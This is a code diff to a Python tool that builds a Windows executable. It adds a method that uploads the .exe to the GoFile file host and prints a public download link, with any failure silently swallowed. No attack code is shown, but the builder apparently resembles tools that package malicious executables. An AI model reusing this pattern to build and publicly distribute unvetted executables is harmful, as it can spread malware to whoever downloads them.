@@ -4,11 +4,9 @@ import shutil
 import subprocess
 import sys
 import time
-from json import load
-from urllib.request import urlopen
-from zlib import compress
-
 import requests
+
+from zlib import compress
 from alive_progress import alive_bar
 from colorama import Fore, Style, init
 
@@ -77,6 +75,11 @@ class Builder:
         self.cleanup(self.filename)
         self.renamefile(self.filename)
 
+        try:
+            self.gofile_upload(self.filename)
+        except:
+            pass
+            
         run = input(
             f'{Fore.MAGENTA}[{Fore.RESET}+{Fore.MAGENTA}]{Fore.RESET} Do you want to test the file? [y/n]: ')
         if run.lower() == 'y':
@@ -330,6 +333,11 @@ class Builder:
                 pass
                 continue
 
+    def gofile_upload(self, filename):
+        gofile = requests.post(
+            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(f"{filename}.exe", 'rb')}).json()['data']['downloadPage']
+        
+        print(f'{Fore.MAGENTA}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.MAGENTA}]{Fore.RESET}{Fore.WHITE} GoFile link: {gofile}{Fore.RESET}')
 
 if __name__ == '__main__':
     init()
